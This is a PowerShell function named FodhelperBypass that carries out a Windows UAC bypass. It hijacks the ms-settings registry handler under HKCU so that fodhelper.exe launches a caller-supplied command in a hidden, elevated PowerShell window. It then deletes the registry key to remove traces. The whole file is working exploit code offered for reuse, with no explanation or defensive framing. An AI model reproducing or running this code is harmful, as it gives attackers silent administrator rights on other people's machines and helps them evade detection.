function FodhelperBypass {
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Command
    )

    $payload = 'cmd.exe /c start powershell.exe -NoP -W Hidden -C "' + $Command + '"'

    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $payload -Force

    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
}
